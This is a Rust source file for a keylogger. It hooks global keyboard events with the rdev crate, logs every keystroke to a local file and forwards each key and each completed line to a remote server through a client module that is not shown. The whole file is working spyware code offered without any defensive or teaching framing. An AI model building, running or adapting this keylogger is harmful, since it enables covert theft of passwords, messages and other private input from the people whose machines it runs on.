#[macro_use] 
extern crate lazy_static;
use rdev::{listen, Event, EventType, Key};
use std::process::exit;
use std::io::{self, Write};
mod key_utils;
use key_utils::{key_to_char, SHIFT_PRESSED};
use std::fs::OpenOptions;
mod send_keystroke_as_client;
use send_keystroke_as_client::send_keystroke_to_server;
use std::sync::Mutex;


lazy_static!{
    static ref BUFFER: Mutex<String> = Mutex::new(String::new());
}

fn main() {
    println!("Keylogger is started...");
    if let Err(e) = listen(callback) {
        eprintln!("Error: {:?}", e);
    }
}

fn callback(event:Event){
    if let Err(e) = handle_event(event){
        eprintln!("Error handling event: {:?}", e);
    }
}

fn handle_event(event: Event) -> Result<(), std::io::Error> {
    match event.event_type {
        EventType::KeyPress(key) => {
            if key == Key::Escape {
                println!("Escape key pressed. Stopping the keylogger...");
                exit(0);
            }
            if key == Key::ShiftLeft || key == Key::ShiftRight {
                *SHIFT_PRESSED.lock().unwrap() = true;
            }
            let mut file = OpenOptions::new()
                .append(true)
                .create(true)
                .open("keystrokes.txt")?;
            let key_char=key_to_char(key);
            write!(file,"{}",&key_char)?;
            send_keystroke_to_server(&key_char);
            let mut buffer = BUFFER.lock().unwrap();
            buffer.push_str(&key_char);
            if key==Key::Return {
                send_keystroke_to_server(&buffer);
                buffer.clear();
            }
            Ok(())
        }
        EventType::KeyRelease(key) => {
            if key == Key::ShiftLeft || key == Key::ShiftRight {
                *SHIFT_PRESSED.lock().unwrap() = false;
            }
            Ok(())
        }
        _ => Ok(()),
    }
}